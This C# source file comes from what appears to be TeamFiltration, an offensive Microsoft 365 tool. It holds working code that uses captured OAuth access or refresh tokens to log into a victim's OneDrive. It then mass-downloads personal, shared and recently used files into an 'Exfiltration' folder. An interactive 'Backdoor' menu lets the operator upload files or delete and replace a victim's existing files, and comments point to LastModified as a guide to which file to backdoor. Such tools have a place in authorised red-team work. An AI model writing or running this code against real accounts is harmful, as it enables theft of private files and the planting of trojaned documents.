using Dasync.Collections;
using KoenZomers.OneDrive.Api;
using KoenZomers.OneDrive.Api.Entities;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using TeamFiltration.Helpers;
using TeamFiltration.Models.MSOL;
using TeamFiltration.Models.TeamFiltration;
using TeamFiltration.Models.Teams;

namespace TeamFiltration.Handlers
{

    class OneDriveHandler
    {
        private HttpClient _oneDriveClient;
        private OneDriveGraphApi _oneDrive;
        private BearerTokenResp _getBearToken { get; set; }
        private DatabaseHandler _databaseHandler { get; set; }
        private string _username { get; set; }

        public static GlobalArgumentsHandler _teamFiltrationConfig { get; set; }


        public OneDriveHandler(BearerTokenResp getBearToken, string username, GlobalArgumentsHandler teamFiltrationConfig, DatabaseHandler databaseHandler)
        {
            this._getBearToken = getBearToken;
            this._username = username;
            this._databaseHandler = databaseHandler;
            _teamFiltrationConfig = teamFiltrationConfig;

            //We are teams!

            _oneDrive = new OneDriveGraphApi("1fec8e78-bce4-4aaf-ab1b-5451cc387264");
            _oneDrive.FireProxAuthUrl = teamFiltrationConfig.GetBaseUrl().Replace("/common/oauth2/token", "/common/oauth2/v2.0/token");

            if (string.IsNullOrEmpty(getBearToken.foci))
            {
                OneDriveAccessToken oneDriveAccessToken = new OneDriveAccessToken()
                {

                    AccessToken = getBearToken.access_token,
                    RefreshToken = getBearToken.refresh_token,
                    AuthenticationToken = getBearToken.access_token,
                    Scopes = getBearToken.scope,
                    TokenType = "",
                    AccessTokenExpirationDuration = Convert.ToInt32(getBearToken.expires_in)

                };
                _oneDrive.AuthenticateUsingAccessToken(oneDriveAccessToken);
            }
            else
            {
                _oneDrive.AuthenticateUsingRefreshToken(getBearToken.refresh_token).GetAwaiter().GetResult();
            }

            //TODO: Add a WAY less shitty way of doing this


            _oneDriveClient = new HttpClient();
            _oneDriveClient.DefaultRequestHeaders.Add("Authorization", $"Bearer {_oneDrive.AccessToken.AccessToken}");


            if (_oneDrive.headerListObject != null)
            {
                foreach (var queryString in _oneDrive.headerListObject)
                {
                    _oneDriveClient.DefaultRequestHeaders.Add(queryString.header, queryString.value);

                }
            }

            _oneDriveClient.DefaultRequestHeaders.CacheControl = new CacheControlHeaderValue
            {
                NoCache = true
            };
        }


        private async Task EnumFolders(OneDriveItem oneDriveItem, OneDriveGraphApi oneDrive, string fullPath, int depth = 0)
        {

            var depthString = string.Concat(Enumerable.Repeat(" ", depth));

            _databaseHandler.WriteLog(new Log("EXFIL", depthString + "|--> " + oneDriveItem.Name + " (Folder) "));
            Directory.CreateDirectory(Path.Combine(fullPath, oneDriveItem.Name));

            if (oneDriveItem.Folder != null)
            {
                var children = await oneDrive.GetAllChildrenByParentItem(oneDriveItem);

                await children.Where(x => x.File != null).ParallelForEachAsync(
                     async item =>
                     {
                         try
                         {
                             _databaseHandler.WriteLog(new Log("EXFIL", string.Concat(Enumerable.Repeat(" ", depth + 2)) + "|--> " + item.Name));


                             if (!File.Exists(Path.Combine(fullPath, oneDriveItem.Name)))
                                 await oneDrive.DownloadItem(item, Path.Combine(fullPath, oneDriveItem.Name));

                         }
                         catch (Exception ex)
                         {
                             _databaseHandler.WriteLog(new Log("EXFIL", $"SOFT ERROR failed to dump file => {ex.Message}"));

                         }
                     },
                     maxDegreeOfParallelism: 8);


                /*
                foreach (var item in children.Where(x => x.File != null))
                {
                    _teamFiltrationConfig.WriteLog(string.Concat(Enumerable.Repeat(" ", depth + 2)) + "|--> " + item.Name, "EXFIL");
                    await oneDrive.DownloadItem(item, Path.Combine(fullPath, oneDriveItem.Name));
                }
                */

                foreach (var item in children.Where(x => x.File == null && x.Size > 0))
                {
                    depth += 2;
                    await EnumFolders(item, oneDrive, Path.Combine(fullPath, oneDriveItem.Name), depth);
                }
            }

        }

        public async Task InteractiveMenu(string currentFolderId, Dictionary<int, OneDriveItem> driveItemDict)
        {
            var baseUserOutPath = Path.Combine(_teamFiltrationConfig.OutPutPath, Helpers.Generic.MakeValidFileName(_username));
            var exfilPath = Path.Combine(baseUserOutPath, "Exfiltration");
            var fullPath = Path.Combine(exfilPath, "Backdoor");

            var currentFolderItem = await _oneDrive.GetItemById(currentFolderId);
            Directory.CreateDirectory(fullPath);


            Console.WriteLine("[+] Type HELP for a list of commands");
            Console.Write("[?] #> ");
            var inputdata = Console.ReadLine();

        Action:



            if (inputdata.ToUpper().StartsWith("UPLOAD "))
            {
                var localFile = inputdata.Split(" ")[1].TrimStart('"').TrimEnd('"');

                if (!File.Exists(localFile))
                {
                    Console.WriteLine("[!] No file at provided path");
                    await DirectoryMove(currentFolderId);
                }

                var uploadedFile = await _oneDrive.UploadFile(localFile, currentFolderItem);
                if (!string.IsNullOrEmpty(uploadedFile.Id))
                    Console.WriteLine("[+] Upload successful!");
                else
                    Console.WriteLine("[+] Upload FAILED :( !\n");

                await DirectoryMove(currentFolderId);

            }

            if (inputdata.ToUpper().StartsWith("SEARCH "))
            {
                var searchPattern = inputdata.Split(" ")[1];

                var searchResults = await _oneDrive.Search(searchPattern);
                //New file dict to populate with items
                driveItemDict = new Dictionary<int, OneDriveItem>() { };

                int index = 0;
                int padValue = searchResults.Max(x => x.Name.Length) + 10;

                foreach (var driveItem in searchResults)
                {
                    //Is this item a filer or a folder?
                    var itemType = (driveItem.File != null) ? "File" : "Folder";

                    driveItemDict.Add(index, driveItem);

                    //LastModified is interesting for finding a file to backdoor
                    Console.WriteLine($"    {index}".PadRight(6) + $"{itemType.PadRight(6)} => {driveItem.Name.PadRight(padValue)} LastModified: {driveItem.LastModifiedDateTime.DateTime}  Path: {driveItem.ParentReference.Path}");
                    index++;
                }
                Console.WriteLine();
                Console.WriteLine("[+] Type HELP for a list of commands");
                Console.Write("[?] #> ");
                inputdata = Console.ReadLine();
                goto Action;
            }

            if (inputdata.ToUpper().Equals("HELP"))
            {
                Console.WriteLine("[*] <FOLDER-INDEX> - Move into directory at index\n[*] BACK - Moves up a directory level\n[*] SEARCH <KEYWORD> - Search for files in OneDrive \n[*] DOWNLOAD - Downloads the entire directory\n[*] UPLOAD <LOCAL-FILE-PATH> Upload a file to the OneDrive directory\n[*] DOWNLOAD <FILE-INDEX> - Download the file at spesificed index\n[*] REPLACE <FILE-INDEX>,<LOCAL-FILE-PATH> - Replace the file at spesificed index with file at local path\n[*] EXIT - Get me out of here!\n");
                await DirectoryMove(currentFolderId);
            }
            if (inputdata.ToUpper().Equals("BACK"))
            {
                await DirectoryMove(currentFolderItem.ParentReference.Id);
            }

            if (inputdata.ToUpper().Equals("EXIT"))
            {
                Environment.Exit(0);
            }

            /* Nope
            if (inputdata.ToUpper().Equals("DOWNLOAD"))
            {
                Console.WriteLine("[+] Downloading the entire folder..\n");


                foreach (var oneDriveItem in driveItemDict)
                {
                    await _oneDrive.DownloadItemAndSaveAs(oneDriveItem.Value, Path.Combine(fullPath, oneDriveItem.Value.Name));
                }
                await DirectoryMove(currentFolderId);
            }
            */

            if (inputdata.ToUpper().StartsWith("DOWNLOAD "))
            {
                var intIndex = Convert.ToInt32(inputdata.Split(" ")[1]);

                driveItemDict.TryGetValue(intIndex, out var oneDriveItem);

                if (oneDriveItem != null)
                {
                    Console.WriteLine($"[+] Downloading {oneDriveItem.Name}\n");
                    await _oneDrive.DownloadItemAndSaveAs(oneDriveItem, Path.Combine(fullPath, oneDriveItem.Name));
                }
                await DirectoryMove(currentFolderId);

            }

            if (inputdata.ToUpper().StartsWith("REPLACE "))
            {
                var inputData = inputdata.Split(" ")[1];

                var intIndex = Convert.ToInt32(inputData.Split(",")[0]);
                var localFile = inputData.Split(",")[1].TrimStart('"').TrimEnd('"');

                if (!File.Exists(localFile))
                {
                    Console.WriteLine("[!] No file at provided path");
                    await DirectoryMove(currentFolderId);
                }

                driveItemDict.TryGetValue(intIndex, out var oneDriveItem);

                if (await _oneDrive.Delete(oneDriveItem))
                {
                    Console.WriteLine("[+] Deleted original file, giving OneDrive a second to catch up");
                }

                Thread.Sleep(1000);

                if (File.Exists(localFile))
                {
                    var uploadedFile = await _oneDrive.UploadFile(localFile, currentFolderItem);
                    if (!string.IsNullOrEmpty(uploadedFile.Id))
                        Console.WriteLine("[+] Upload successful!\n");
                    else
                        Console.WriteLine("[+] Upload FAILED :( !\n");
                }
                Thread.Sleep(2000);
                await DirectoryMove(currentFolderId);
            }

            Int32.TryParse(inputdata, out var intInputData);

            driveItemDict.TryGetValue(intInputData, out var selectedOneDriveItem);

            if (selectedOneDriveItem.File == null)
                await DirectoryMove(selectedOneDriveItem.Id);

            await DirectoryMove(currentFolderId);

        }
        public async Task DirectoryMove(string folderId)
        {
            var rootChild = await _oneDrive.GetAllChildrenByFolderId(folderId);
            var fileDict = new Dictionary<int, OneDriveItem>() { };
            int index = 0;
            int padValue = rootChild.Max(x => x.Name.Length) + 10;
            foreach (var childItem in rootChild)
            {
                var itemType = (childItem.File != null) ? "File" : "Folder";
                fileDict.Add(index, childItem);

                Console.WriteLine($"    {index}".PadRight(6) + $"{itemType.PadRight(6)} => {childItem.Name.PadRight(padValue)} LastModified: {childItem.LastModifiedDateTime.DateTime}   Path: {childItem.ParentReference.Path}");
                index++;
            }
            await InteractiveMenu(folderId, fileDict);

        }

        public async Task StartInteractive()
        {


            //Get root elements from the OneDrive folder
            var rootDriveItems = await _oneDrive.GetAllDriveRootChildren();

            if (rootDriveItems.Count() == 0)
            {
                Console.WriteLine("[+] OneDrive has not been configured for this user, exiting!");
                Environment.Exit(0);
            }
            //Get the ParentReference (Root folder) item
            OneDriveItemReference rootFolderItem = rootDriveItems.FirstOrDefault().ParentReference;

            //New file dict to populate with items
            Dictionary<int, OneDriveItem> fileDict = new Dictionary<int, OneDriveItem>() { };

            int index = 0;
            int padValue = rootDriveItems.Max(x => x.Name.Length) + 10;
            Console.WriteLine();
            foreach (var driveItem in rootDriveItems)
            {
                //Is this item a filer or a folder?
                var itemType = (driveItem.File != null) ? "File" : "Folder";

                fileDict.Add(index, driveItem);


                //LastModified is interesting for finding a file to backdoor
                Console.WriteLine($"    {index}".PadRight(6) + $"{itemType.PadRight(6)} => {driveItem.Name.PadRight(padValue)} LastModified: {driveItem.LastModifiedDateTime.DateTime}  Path: {driveItem.ParentReference.Path}");
                index++;
            }

            await InteractiveMenu(rootFolderItem.Id, fileDict);

        }

        public async Task GetShared(string exfilFolder, OneDriveItem oneDriveItem = null)
        {

            var fullPath = Path.Combine(exfilFolder, "SharedFiles");
            Directory.CreateDirectory(fullPath);

            if (oneDriveItem == null)
            {


                try
                {
                    var userSharedItems = await _oneDrive.GetSharedWithMe();
                    if (userSharedItems != null)
                        foreach (var sharedItem in userSharedItems.Collection)
                        {
                            if (sharedItem.Folder == null)
                            {

                                var tempName = Path.Combine(fullPath, sharedItem.Name);
                                var file = await _oneDrive.DownloadItemAndSaveAs(sharedItem, tempName);
                            }
                            else
                            {
                                await GetShared(exfilFolder, sharedItem);
                            }


                        }

                }
                catch (Exception)
                {


                }
            }
            else
            {
                var filesChild = await _oneDrive.GetChildrenByParentItem(oneDriveItem);
                foreach (var fileObject in filesChild.Collection)
                {
                    if (fileObject.Folder == null)
                    {
                        var tempNameFile = Path.Combine(fullPath, oneDriveItem.Name);
                        Directory.CreateDirectory(tempNameFile);
                        var fileChild = await _oneDrive.DownloadItemAndSaveAs(fileObject, Path.Combine(tempNameFile, fileObject.Name));
                    }
                    else
                    {
                        await GetShared(exfilFolder, fileObject);
                    }
                }

            }

        }





        public async Task DumpPersonalOneDrive(string outPath)
        {
            var fullPath = Path.Combine(outPath, "SyncedFiles");
            Directory.CreateDirectory(fullPath);


            var rootDrive = await _oneDrive.GetAllDriveRootChildren();
            var driveIfo = await _oneDrive.GetDrive();


            foreach (var oneDriveItem in rootDrive.Where(x => x.File != null))
            {
                try
                {



                    _databaseHandler.WriteLog(new Log("EXFIL", "-->" + oneDriveItem.Name));

                    if (!File.Exists(Path.Combine(fullPath, oneDriveItem.Name)))
                        await _oneDrive.DownloadItem(oneDriveItem, fullPath);
                }
                catch (Exception e)
                {
                    _databaseHandler.WriteLog(new Log("EXFIL", $"Failed to download file {oneDriveItem.Name}"));

                }

            }


            await rootDrive.Where(x => x.File == null).ParallelForEachAsync(
                async oneDriveItem =>
                {
                    try
                    {
                        await EnumFolders(oneDriveItem, _oneDrive, fullPath);

                    }
                    catch (Exception ex)
                    {

                        _databaseHandler.WriteLog(new Log("EXFIL", $"SOFT ERROR failed to dump folder => {ex.Message}"));
                    }
                },
                maxDegreeOfParallelism: 8);




        }
        public async Task DownloadAttachment(FileData fileObject, string newOutPath, string module, string accesToken)
        {
            try
            {


                //We need to look at the baseURL to determine what client to
                var url = @$"{fileObject.baseUrl}/_api/web/GetFileById('{fileObject.id}')/$value";

                var httpReq = new HttpRequestMessage(HttpMethod.Get, url);

                httpReq.Headers.Add("Authorization", $"Bearer {accesToken}");

                var httpClient = new HttpClient();

                var oneDriveReq = await httpClient.SendAsync(httpReq);

                var rawData = await oneDriveReq.Content.ReadAsByteArrayAsync();

                File.WriteAllBytes(Path.Combine(newOutPath, fileObject.fileName), rawData);
            }
            catch (Exception e)
            {
                _databaseHandler.WriteLog(new Log(module, $"Failed to download file {fileObject.fileName}"));

            }

        }

        public async Task<SharePointSite> GetSiteRoot()
        {
            return await _oneDrive.GetSiteRoot();
        }

        public async Task<DownloadUrlResp> GetDownloadInfo(string baseUrl)
        {
            var oneDriveUrl = $"{baseUrl}/driveItem?select=@microsoft.graph.downloadUrl";

            var oneDriveReq = await _oneDriveClient.PollyGetAsync(oneDriveUrl);
            var rawData = await oneDriveReq.Content.ReadAsStringAsync();
            return JsonConvert.DeserializeObject<DownloadUrlResp>(rawData);


        }

        public async Task DownloadRecentFiles(TeamsFileResp recentFiles, string outPath, string module)
        {

            var newOutPath = Path.Combine(outPath, "RecentFiles");

            Directory.CreateDirectory(newOutPath);

            using (var webClient = new WebClient())
            {

                foreach (Value file in recentFiles.value.Where(x => x.objectUrl.StartsWith(_getBearToken.resource)))
                {
                    try
                    {
                        //https://XX.sharepoint.com/_api/v2.0/shares/
                        if (file.siteInfo.siteUrl == null)
                        {
                            file.siteInfo.siteUrl = _getBearToken.resource + "/_api/v2.0/shares/u!" + Convert.ToBase64String(Encoding.UTF8.GetBytes(file.objectUrl)).Replace("=", "");
                        }
                        else
                        {
                            file.siteInfo.siteUrl += "/_api/v2.0/sites/root/items/" + file.objectId;
                        }
                        var downloadInfo = await GetDownloadInfo(file.siteInfo.siteUrl);

                        if (downloadInfo?.ContentDownloadUrl != null)
                        {

                            var oneDriveReq = await _oneDriveClient.PollyGetAsync(downloadInfo?.ContentDownloadUrl);

                            var rawData = await oneDriveReq.Content.ReadAsByteArrayAsync();

                            File.WriteAllBytes(Path.Combine(newOutPath, file.title), rawData);
                        }
                        //  await webClient.DownloadFileTaskAsync(downloadInfo.ContentDownloadUrl, newOutPath + file.title);
                    }
                    catch (Exception e)
                    {
                        _databaseHandler.WriteLog(new Log(module, $"Failed to download file {file.title}"));

                    }
                }
            }
        }





    }
}
